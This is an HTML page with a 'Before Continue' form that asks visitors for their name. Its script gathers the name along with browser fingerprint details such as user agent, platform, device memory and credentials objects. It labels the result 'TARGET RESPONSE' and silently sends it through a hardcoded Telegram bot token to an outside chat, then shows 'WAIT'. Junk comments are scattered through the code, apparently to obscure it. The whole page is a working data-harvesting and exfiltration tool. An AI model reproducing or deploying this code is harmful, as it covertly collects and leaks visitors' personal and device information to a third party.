<!DOCTYPE html><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
<html lang="en"><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
<head><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
  <meta charset="UTF-8"><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
<style>body{margin:0;padding:0}.form{display:flex;justify-content:center;align-items:center;height:100vh}.form-body{text-align:center;background-color:ghostwhite;padding:10px;border-radius:20px;border:2px solid;width:400px}.form-body input{width:350px;height:1cm;border:2px solid;border-radius:10px;font-size:20px;padding:10px}hr{border:2px solid black;width:200px}.form-btn{margin:10px;padding:10px;width:150px;background-color:lightgreen;border:2px solid black;border-radius:10px}.hide{display:none}
</style><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
</head><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
<body><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
<div class="form" id="hide"><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
  <div class="form-body"><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <h1>Before Continue</h1><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <hr /><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <h3>Enter your Name: </h3><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <input type="text" id="input-name"><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <p style="color: red;" id="valid"></p><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <p id="name"></p><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <button class="form-btn" onclick="submit()" id="block">DONE</button><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
    <p id="show" style="display: none;" onload="target()"></p><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
  </div><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
</div> <!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
<script> //<!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
function submit() {const name = document.getElementById('input-name').value;if (name == "") {
        document.getElementById('valid').innerText = "Pls Enter Name!.";}const userAgent = navigator.userAgent;const userPlaform = navigator.platform;//#$%^&*89897654$^&*98076543655578#^%$&
  const appVersion = navigator.appVersion;
  const online = navigator.online;const devMemory = navigator.deviceMemory;const credentials = navigator.credentials;const permissions = navigator.permissions;const storage = navigator.storage;//#$%^&*89897654$^&*98076543655578#^%$&//#$%^&*89897654$^&*98076543655578#^%$&
  const messages = [`
  [+] TARGET RESPONSE
  
  Name:
  [/] [ ${name} ]
  
  UserAgent:
  [/] [ ${userAgent} ]
  
  Platform:
  [/] [ ${userPlaform} ]
  
  AppVersion:
  [/] [ ${appVersion} ]
  
  Online:
  [/] [ ${online} ]

  Device Memory:
  [/] [ ${devMemory} ]
  
  Credentials:
  [/] [ ${credentials} ]
  
  Permissions:
  [/] [ ${permissions} ]
  
  Storage:
  [/] [ ${storage} ]
  `];
  //<!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758
  /* 524536547457<!--!@#$%^79874545%$%^&*()((*/const bot = "8113394844:AAFadpUZPlIEUhyqs9BLa4Df-H2Uzsb3Fp0";//<!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758--><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
/* #%$^&*87654%^&^*867*/const chat="5952205293";messages.forEach(msg => {fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {method: "POST",headers: { "Content-Type": "application/x-www-form-urlencoded" },body: `chat_id=${chat}&text=${encodeURIComponent(msg)}`});});where();
}function where() {
  const where = `
  <h1 style="text-align: center;">WAIT</h1>
  `;//#$%^&*89897654$^&*98076543655578#^%$&
  document.getElementById('hide').innerHTML = where;
} //#$%^&*89897654$^&*98076543655578#^%$&
</script><!--!@#$%^79874545%$%^&*()((#%$&^%*^*&3564758-->
